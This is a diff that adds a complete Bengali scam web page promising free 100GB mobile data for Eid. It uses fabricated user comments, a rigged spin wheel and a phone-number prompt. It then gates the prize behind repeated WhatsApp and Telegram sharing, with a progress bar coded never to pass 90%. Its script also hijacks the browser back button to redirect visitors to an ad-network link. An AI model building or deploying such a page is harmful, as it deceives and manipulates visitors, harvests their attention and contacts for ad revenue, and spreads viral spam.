@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNd1HPWGEj4XD1tQKZabnnD-biKXSdDnStYtEuE14WpZIA-Ax7TBv-Ns32A850qU0HlZNgISm-Lu0P_0wvO_Dk44pQPtS8C5m93eFrPfrK-Juzn29NSoWy3snVRkBtRntiQAUiVFynmYQd_-pMArXWla3yNZVMJoM01LAWxEy9i2qaLO5GJwUexTsA3gM/s600/Cover.png">  
+  <meta property="og:url"
+    <title>ঈদ মোবারক - বিনামূল্যে 100GB ডাটা!</title>
+      <link rel="icon" href="Eid al-adha wish.png"> <!-- Added Favicon -->
+    <style>
+        /* General Styles */
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5; /* Facebook-like background */
+            color: #333;
+            text-align: center;
+            overflow-x: hidden; /* Prevent horizontal scroll */
+        }
+
+        /* Page Sections */
+        .page-section {
+            padding: 20px;
+            box-sizing: border-box;
+            max-width: 600px; /* Max width for content */
+            margin: 20px auto;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            transition: opacity 0.5s ease-in-out, max-height 0.5s ease-in-out;
+            overflow: hidden;
+        }
+        .page-section.hidden {
+            opacity: 0;
+            max-height: 0;
+            padding-top: 0;
+            padding-bottom: 0;
+            margin-top: 0;
+            margin-bottom: 0;
+            border: none;
+            box-shadow: none;
+            /* display: none; REMOVED for transition */
+        }
+         .page-section.visible {
+            opacity: 1;
+            max-height: 2000px; /* Adjust as needed for content */
+        }
+
+
+        /* Cover Image */
+        #cover-image {
+            width: 100%;
+            max-width: 500px; /* Adjust as needed */
+            height: auto;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        /* H1 Tag with Eid Effect */
+        #main-heading {
+            font-size: 28px; /* Responsive font size */
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #2c3e50;
+            animation: eidVibes 3s infinite ease-in-out;
+        }
+        @keyframes eidVibes {
+            0%, 100% {
+                text-shadow: 0 0 5px #FFD700, 0 0 10px #FFD700, 0 0 15px #4CAF50, 0 0 20px #4CAF50;
+                color: #2E8B57; /* Darker Green */
+            }
+            50% {
+                text-shadow: 0 0 5px #FFA500, 0 0 10px #FFA500, 0 0 15px #FF6347, 0 0 20px #FF6347;
+                color: #FF4500; /* OrangeRed */
+            }
+        }
+        @media (max-width: 600px) {
+            #main-heading {
+                font-size: 22px;
+            }
+        }
+
+
+        /* Click Here Button */
+        #click-here-button {
+            cursor: pointer;
+            border: none;
+            background: none;
+            margin-bottom: 20px;
+            display: flex; /* Added for centering */
+            justify-content: center; /* Added for centering */
+            align-items: center; /* Added for centering */
+        }
+        #click-here-button img {
+            max-width: 250px; /* Adjust as needed */
+            width: 80%;
+            height: auto;
+        }
+
+        /* Ads Styling */
+        .ad-container {
+            margin: 20px auto; /* Center the ad */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Facebook-like Comment Box */
+        .comments-section {
+            margin-top: 30px;
+            text-align: left;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            padding: 15px;
+        }
+        .comment {
+            display: flex;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+        }
+        .comment:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+        }
+        .comment-profile-pic {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 10px;
+            object-fit: cover;
+        }
+        .comment-content {
+            flex-grow: 1;
+        }
+        .comment-user-name {
+            font-weight: bold;
+            color: #385898; /* Facebook blue */
+            font-size: 0.9em;
+        }
+        .comment-text {
+            margin: 5px 0;
+            font-size: 0.9em;
+            color: #1c1e21;
+            line-height: 1.4;
+        }
+        .comment-actions {
+            font-size: 0.8em;
+            color: #606770;
+        }
+        .comment-actions span {
+            cursor: pointer;
+        }
+        .comment-actions span:hover {
+            text-decoration: underline;
+        }
+
+        /* Spin Page */
+        #spin-image-container { /* Added container for better control if needed */
+            margin-bottom: 20px;
+            display: inline-block; /* To make transform-origin work as expected */
+        }
+        #spin-image {
+            max-width: 300px;
+            width: 80%;
+            height: auto;
+            border-radius: 8px;
+            /* box-shadow: 0 4px 8px rgba(0,0,0,0.2); Removed for cleaner spin */
+            display: block; /* Ensures margin auto works if container is block */
+            margin-left: auto;
+            margin-right: auto;
+        }
+        /* Spin animation */
+        @keyframes spinAnimation {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(1080deg); } /* 3 full spins */
+        }
+        .spinning {
+            animation: spinAnimation 2s cubic-bezier(0.25, 0.1, 0.25, 1); /* Spin for 2 seconds with easing */
+        }
+
+        #gb-won-message {
+            font-size: 20px;
+            font-weight: bold;
+            color: #4CAF50;
+            margin: 15px 0;
+            padding: 10px;
+            background-color: #e9f5e9;
+            border: 1px solid #c8e6c9;
+            border-radius: 5px;
+            transition: opacity 0.3s ease-in-out, transform 0.3s ease-in-out;
+            opacity: 0;
+            transform: translateY(10px);
+        }
+         #gb-won-message.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+
+        /* Buttons (Spin, Claim, Share, Confirmation) */
+        .action-button, .share-button {
+            background-color: #4CAF50; /* Green */
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 25px; /* Rounded buttons */
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            text-decoration: none;
+            display: inline-block;
+            margin: 10px 5px;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.2s ease;
+            box-shadow: 0 4px 0 #388E3C; /* 3D effect */
+        }
+        .action-button:hover, .share-button:hover {
+            background-color: #45a049; /* Darker green */
+            transform: translateY(-2px);
+            box-shadow: 0 6px 0 #388E3C;
+        }
+        .action-button:active, .share-button:active {
+            transform: translateY(1px);
+            box-shadow: 0 2px 0 #388E3C;
+        }
+        .action-button:disabled {
+            background-color: #ccc;
+            box-shadow: 0 4px 0 #999;
+            cursor: not-allowed;
+        }
+
+
+        /* Specific Share Button Styles */
+        #copy-link-button { background-color: #555; box-shadow: 0 4px 0 #333; }
+        #copy-link-button:hover { background-color: #444; box-shadow: 0 6px 0 #333;}
+        #copy-link-button:active {box-shadow: 0 2px 0 #333;}
+
+        #whatsapp-share-button { background-color: #25D366; box-shadow: 0 4px 0 #1DAE54;}
+        #whatsapp-share-button:hover { background-color: #1DAE54; box-shadow: 0 6px 0 #1DAE54;}
+        #whatsapp-share-button:active {box-shadow: 0 2px 0 #1DAE54;}
+
+        #telegram-share-button { background-color: #0088cc; box-shadow: 0 4px 0 #006BA8;}
+        #telegram-share-button:hover { background-color: #0077b3; box-shadow: 0 6px 0 #006BA8;}
+        #telegram-share-button:active {box-shadow: 0 2px 0 #006BA8;}
+
+        .share-buttons-container {
+            margin-top: 20px;
+            display: flex;
+            flex-wrap: wrap; /* Allow buttons to wrap on smaller screens */
+            justify-content: center;
+            align-items: center;
+        }
+        .share-button {
+            min-width: 150px; /* Ensure buttons have a decent width */
+        }
+
+        /* Phone Input Section */
+        #phone-input-section {
+            margin-top: 20px;
+            transition: opacity 0.3s ease-in-out, transform 0.3s ease-in-out;
+            opacity: 0;
+            transform: translateY(10px);
+        }
+        #phone-input-section.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        #phone-number-input {
+            padding: 10px 15px;
+            border-radius: 20px;
+            border: 1px solid #ccc;
+            width: 70%;
+            max-width: 280px;
+            margin-bottom: 10px;
+            font-size: 16px;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+        }
+        #phone-number-input::placeholder {
+            color: #999;
+        }
+
+
+        /* Dynamic Share Section (Progress Bar, etc.) */
+        #dynamic-share-section {
+            /* background-color: transparent;
+            box-shadow: none; */ /* Removed to keep section styling */
+            padding-top: 10px;
+            margin-top: 15px;
+            transition: opacity 0.5s ease-in-out, max-height 0.5s ease-in-out;
+            opacity: 0;
+            max-height: 0;
+            overflow: hidden;
+        }
+         #dynamic-share-section.visible {
+            opacity: 1;
+            max-height: 500px; /* Adjust if content is taller */
+        }
+
+        #progress-info-text {
+            font-size: 16px;
+            color: #c0392b; /* Slightly different red */
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        .progress-bar-container {
+            width: 90%;
+            max-width: 400px;
+            background-color: #e0e0e0;
+            border-radius: 25px;
+            margin: 20px auto;
+            padding: 4px;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.2);
+        }
+        #progress-bar {
+            width: 0%;
+            height: 28px;
+            background-color: #4CAF50;
+            border-radius: 20px;
+            text-align: center;
+            line-height: 28px;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+            transition: width 0.5s ease-in-out;
+        }
+        #progress-bar.loading {
+            background-image: linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
+            background-size: 40px 40px;
+            animation: progress-bar-stripes 1s linear infinite;
+        }
+        @keyframes progress-bar-stripes {
+            from { background-position: 40px 0; }
+            to { background-position: 0 0; }
+        }
+
+
+        /* Simple Notification for Copy Link */
+        #copy-notification {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #333;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+        #copy-notification.show {
+            opacity: 1;
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- Main Page Section -->
+    <div id="main-page" class="page-section visible">
+        <img id="cover-image" src="Cover.gif" alt="ঈদ অফার কভার">
+        <h1 id="main-heading">সমস্ত নেটওয়ার্ক এর জন্য বিনামূল্যে 100GB ডাটা প্লান</h1>
+        <div id="click-here-button">
+            <img src="Click Here.gif" alt="এখানে ক্লিক করুন">
+        </div>
+        
+        <!-- Advertica Ad 1 -->
+        <div class="ad-container">
+            <ins style="width: 468px;height:60px" data-width="468" data-height="60" class="m38d029d27c" data-domain="//data963.click" data-affquery="/cf5e6af0c58d7ba1d208/38d029d27c/?placementName=100GBinternet"><script src="//data963.click/js/responsive.js" async></script></ins>
+        </div>
+
+        <div class="comments-section">
+            <h4>Recent Comments:</h4>
+            <!-- Comments ... (kept as is) -->
+            <div class="comment">
+                <img src="Comment1.png" alt="Profile Pic" class="comment-profile-pic">
+                <div class="comment-content">
+                    <span class="comment-user-name">মোঃ আব্দুল্লাহ</span>
+                    <p class="comment-text">অসাধারণ অফার! আমি এইমাত্র ২৫ জিবি পেলাম। ধন্যবাদ!</p>
+                    <span class="comment-actions"><span>Like</span> · <span>Reply</span> · 1h</span>
+                </div>
+            </div>
+            <div class="comment">
+                <img src="Comment2.png" alt="Profile Pic" class="comment-profile-pic">
+                <div class="comment-content">
+                    <span class="comment-user-name">ফারিয়া আক্তার</span>
+                    <p class="comment-text">সত্যিই কাজ করে! 😍 ঈদের সেরা উপহার।</p>
+                    <span class="comment-actions"><span>Like</span> · <span>Reply</span> · 45m</span>
+                </div>
+            </div>
+            <div class="comment">
+                <img src="Comment3.png" alt="Profile Pic" class="comment-profile-pic">
+                <div class="comment-content">
+                    <span class="comment-user-name">সাকিব খান</span>
+                    <p class="comment-text">আমি ৫০ জিবি পেয়েছি! সবাইকে ঈদ মোবারক।</p>
+                    <span class="comment-actions"><span>Like</span> · <span>Reply</span> · 30m</span>
+                </div>
+            </div>
+            <div class="comment">
+                <img src="Comment4.png" alt="Profile Pic" class="comment-profile-pic">
+                <div class="comment-content">
+                    <span class="comment-user-name">নাদিয়া ইসলাম</span>
+                    <p class="comment-text">এটা কি সত্যি? চেষ্টা করে দেখবো।</p>
+                    <span class="comment-actions"><span>Like</span> · <span>Reply</span> · 15m</span>
+                </div>
+            </div>
+            <div class="comment">
+                <img src="Comment5.png" alt="Profile Pic" class="comment-profile-pic">
+                <div class="comment-content">
+                    <span class="comment-user-name">রহিম শেখ</span>
+                    <p class="comment-text">আমি ক্লিক করেছি, এখন স্পিন করবো। দোয়া করবেন যেন বেশি পাই!</p>
+                    <span class="comment-actions"><span>Like</span> · <span>Reply</span> · 5m</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Spin Page Section (Initially Hidden by default, made visible by JS) -->
+    <div id="spin-page" class="page-section hidden">
+        <h2>Spin করুন 10 থেকে 100 GB Internet জীতুন!</h2>
+        <div id="spin-image-container">
+            <img id="spin-image" src="Spin.png" alt="স্পিন হুইল">
+        </div>
+        
+        <button id="spin-now-button" class="action-button">Spin Now</button>
+        
+        <!-- Advertica Ad 2 -->
+        <div class="ad-container">
+            <ins style="width: 468px;height:60px" data-width="468" data-height="60" class="m38d029d27c" data-domain="//data963.click" data-affquery="/cf5e6af0c58d7ba1d208/38d029d27c/?placementName=100GBinternet"><script src="//data963.click/js/responsive.js" async></script></ins>
+        </div>
+
+        <div id="gb-won-message" class="hidden"></div>
+
+        <div id="phone-input-section" class="hidden">
+            <input type="tel" id="phone-number-input" placeholder="আপনার ফোন নম্বর দিন">
+            <button id="confirmation-button" class="action-button">নিশ্চিত করুন</button>
+        </div>
+        
+        <!-- Dynamic Share Section moved here -->
+        <div id="dynamic-share-section" class="hidden">
+            <h3 id="final-share-heading" style="margin-top: 25px; color: #333;">অফারটি বন্ধুদের সাথে শেয়ার করুন!</h3>
+            <p id="progress-info-text" style="font-size: 16px; color: #e74c3c; font-weight: bold; margin-bottom: 10px;">বক্স টি 100% পূর্ণ না হওয়া পর্যন্ত শেয়ার করতে থাকুন।</p>
+            
+            <div class="progress-bar-container">
+                <div id="progress-bar">0%</div>
+            </div>
+            
+            <div class="share-buttons-container" id="final-share-buttons">
+                <button id="copy-link-button" class="share-button">🔗 Copy Link</button>
+                <button id="whatsapp-share-button" class="share-button">💬 Share on WhatsApp</button>
+                <button id="telegram-share-button" class="share-button">✈️ Share on Telegram</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Share Page Section is now integrated into spin-page as dynamic-share-section -->
+    <!-- <div id="share-page" class="page-section hidden"> ... </div> -->
+
+    <div id="copy-notification">লিঙ্ক কপি করা হয়েছে!</div>
+
+    <script>
+        // DOM Elements
+        const mainPage = document.getElementById('main-page');
+        const spinPage = document.getElementById('spin-page');
+        // const sharePage = document.getElementById('share-page'); // No longer a separate page
+
+        const clickHereButton = document.getElementById('click-here-button');
+        const spinNowButton = document.getElementById('spin-now-button');
+        const spinImage = document.getElementById('spin-image'); 
+        
+        const gbWonMessage = document.getElementById('gb-won-message');
+        
+        const phoneInputSection = document.getElementById('phone-input-section');
+        const phoneNumberInput = document.getElementById('phone-number-input');
+        const confirmationButton = document.getElementById('confirmation-button');
+
+        const dynamicShareSection = document.getElementById('dynamic-share-section');
+        const finalShareHeading = document.getElementById('final-share-heading'); // Added for completeness
+        const progressInfoText = document.getElementById('progress-info-text');
+        const progressBar = document.getElementById('progress-bar');
+        
+        const copyLinkButton = document.getElementById('copy-link-button');
+        const whatsappShareButton = document.getElementById('whatsapp-share-button');
+        const telegramShareButton = document.getElementById('telegram-share-button');
+        // const messengerShareButton = document.getElementById('messenger-share-button'); // Removed
+        const copyNotification = document.getElementById('copy-notification');
+
+        let wonGB = 0; 
+        let shareCount = 0;
+        let shareProgress = 0;
+        const shareTextGlobal = "*🎉 ঈদ মোবারক! 100 জিবি ফ্রি ইন্টারনেট! আমিও পেয়েছি, আপনিও নিতে পারেন↓*";
+
+
+        // 1. Back Button Redirect Logic (Kept as is)
+        let backButtonPressed = false;
+        const redirectUrl = 'https://bcyxwn.click/f597d7be567ba3cffcf0/83e53eb7b4/?placementName=Sign';
+        
+        history.pushState({ page: 1 }, "initial", "#initial"); 
+        window.addEventListener('load', () => {
+            history.pushState(null, '', window.location.href + '#loaded'); 
+        });
+
+        window.addEventListener('popstate', function(event) {
+            if (!backButtonPressed && window.location.hash !== '#initial') {
+                backButtonPressed = true; 
+                window.location.href = redirectUrl;
+            } else if (window.location.hash === '#initial') {
+                // Prevent going back further than the initial loaded state if they somehow land on #initial
+                history.pushState(null, '', window.location.href.replace('#initial', '') + '#loaded');
+            }
+        });
+
+
+        // 2. "Click Here.gif" button functionality
+        clickHereButton.addEventListener('click', function() {
+            mainPage.classList.remove('visible');
+            mainPage.classList.add('hidden');
+            
+            setTimeout(() => { // Delay for smooth transition
+                mainPage.style.display = 'none'; // Fully hide after transition
+                spinPage.style.display = 'block'; // Make block before adding visible
+                setTimeout(() => { // Stagger for display block to take effect
+                    spinPage.classList.remove('hidden');
+                    spinPage.classList.add('visible');
+                }, 50);
+                window.scrollTo(0, 0); 
+            }, 500); // Match CSS transition time
+        });
+
+        // 3. "Spin Now" button functionality
+        spinNowButton.addEventListener('click', function() {
+            spinNowButton.disabled = true; 
+            spinNowButton.textContent = 'স্পিনিং...';
+            
+            spinImage.classList.add('spinning');
+            // spinImage.style.boxShadow = 'none'; // Removed shadow earlier
+
+            setTimeout(() => {
+                spinImage.classList.remove('spinning'); 
+                // spinImage.style.boxShadow = ''; // Restore if needed
+
+                const possibleGBs = [10, 15, 20, 25, 30, 50, 75, 100]; 
+                wonGB = possibleGBs[Math.floor(Math.random() * possibleGBs.length)];
+                
+                gbWonMessage.innerHTML = `🎉 অভিনন্দন! আপনি জিতেছেন ${wonGB}GB ইন্টারনেট! 🎉`;
+                gbWonMessage.classList.remove('hidden');
+                gbWonMessage.classList.add('visible');
+                
+                spinNowButton.style.display = 'none'; // Hide Spin Now button
+
+                phoneInputSection.classList.remove('hidden');
+                phoneInputSection.classList.add('visible');
+
+            }, 2000); // 2 seconds for spinning
+        });
+
+        // 4. "Confirmation" button functionality
+        confirmationButton.addEventListener('click', function() {
+            const phoneNumber = phoneNumberInput.value.trim();
+            // Basic validation (optional, can be improved)
+            if (phoneNumber.length < 10 || !/^[0-9]+$/.test(phoneNumber)) {
+                alert("দয়া করে একটি সঠিক ফোন নম্বর দিন।");
+                return;
+            }
+            
+            confirmationButton.disabled = true;
+            confirmationButton.textContent = 'প্রসেসিং...';
+
+            // Smoothly hide phone input section
+            phoneInputSection.classList.remove('visible');
+            phoneInputSection.classList.add('hidden');
+
+            setTimeout(() => {
+                phoneInputSection.style.display = 'none';
+
+                // Show dynamic share section
+                dynamicShareSection.style.display = 'block';
+                setTimeout(() => {
+                    dynamicShareSection.classList.remove('hidden');
+                    dynamicShareSection.classList.add('visible');
+                    finalShareHeading.textContent = `অভিনন্দন! আপনার ${wonGB}GB বোনাস Claim করতে শেয়ার করুন!`;
+                    updateProgressBar(); // Initialize progress bar
+                }, 50);
+                window.scrollTo(0, document.body.scrollHeight); // Scroll to show new section
+            }, 500); // Match CSS transition
+        });
+
+
+        // 5. Share Button Functionalities
+        const currentUrl = window.location.href;
+
+        function handleShareAction() {
+            shareCount++;
+            if (shareCount === 1) {
+                shareProgress = 50;
+            } else if (shareProgress < 90) {
+                shareProgress = Math.min(90, shareProgress + 10);
+            }
+            updateProgressBar();
+        }
+
+        function updateProgressBar() {
+            progressBar.style.width = shareProgress + '%';
+            progressBar.textContent = shareProgress + '%';
+
+            if (shareProgress < 90) {
+                progressInfoText.textContent = "বক্স টি 100% পূর্ণ না হওয়া পর্যন্ত শেয়ার করতে থাকুন।";
+                progressBar.classList.remove('loading');
+            } else if (shareProgress === 90) {
+                progressInfoText.innerHTML = "আর একটু! অফারটি নিশ্চিত করতে আরও শেয়ার করুন অথবা কিছুক্ষণ অপেক্ষা করুন...";
+                progressBar.textContent = 'লোড হচ্ছে...';
+                progressBar.classList.add('loading'); 
+                // Disable share buttons if needed or change their text
+                // copyLinkButton.disabled = true;
+                // whatsappShareButton.disabled = true;
+                // telegramShareButton.disabled = true;
+            }
+        }
+
+        // a) Copy Link
+        copyLinkButton.addEventListener('click', function() {
+            navigator.clipboard.writeText(shareTextGlobal + " " + currentUrl).then(() => {
+                copyNotification.textContent = 'লিঙ্ক কপি করা হয়েছে!';
+                copyNotification.classList.add('show');
+                setTimeout(() => {
+                    copyNotification.classList.remove('show');
+                }, 2000);
+                handleShareAction();
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+                alert('লিঙ্ক কপি করতে সমস্যা হয়েছে। অনুগ্রহ করে ম্যানুয়ালি কপি করুন।');
+            });
+        });
+
+        // b) Share on WhatsApp
+        whatsappShareButton.addEventListener('click', function() {
+            const whatsappUrl = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareTextGlobal + " " + currentUrl)}`;
+            window.open(whatsappUrl, '_blank');
+            handleShareAction();
+        });
+
+        // c) Share on Telegram
+        telegramShareButton.addEventListener('click', function() {
+            const telegramUrl = `https://t.me/share/url?url=${encodeURIComponent(currentUrl)}&text=${encodeURIComponent(shareTextGlobal)}`;
+            window.open(telegramUrl, '_blank');
+            handleShareAction();
+        });
+        
+        // Initial setup for hidden sections that will become visible
+        // This ensures they are part of the layout flow for transitions.
+        document.addEventListener('DOMContentLoaded', () => {
+            // spinPage.style.display = 'none'; // Handled by initial hidden class
+            // gbWonMessage.style.display = 'none'; // Handled by initial hidden class
+            // phoneInputSection.style.display = 'none'; // Handled by initial hidden class
+            // dynamicShareSection.style.display = 'none'; // Handled by initial hidden class
+
+            // Ensure all initially hidden sections are truly not displayed until made visible
+            const allHiddenSections = document.querySelectorAll('.page-section.hidden, #gb-won-message.hidden, #phone-input-section.hidden, #dynamic-share-section.hidden');
+            allHiddenSections.forEach(section => {
+                if (!section.classList.contains('visible')) {
+                     // If it's a page-section, it will be handled by opacity/max-height
+                    // For others, ensure they are not 'display: block' if they shouldn't be
+                    if (!section.classList.contains('page-section')) {
+                        // section.style.display = 'none'; // Reconsider this if it breaks transitions
+                    }
+                }
+            });
+        });
+
+
+        // Image error handling for comments
+        document.querySelectorAll('.comment-profile-pic').forEach(img => {
+            img.onerror = function() {
+                this.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgdmlld0JveD0iMCAwIDQwIDQwIj4KICA8cmVjdCB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIGZpbGw9IiNjY2MiLz4KICA8dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjIwIiBmaWxsPSIjZmZmIj5VUzwvdGV4dD4KPC9zdmc+Cg==';
+                this.alt = "User";
+            };
+        });
+
+    </script>
+</body>
+</html>
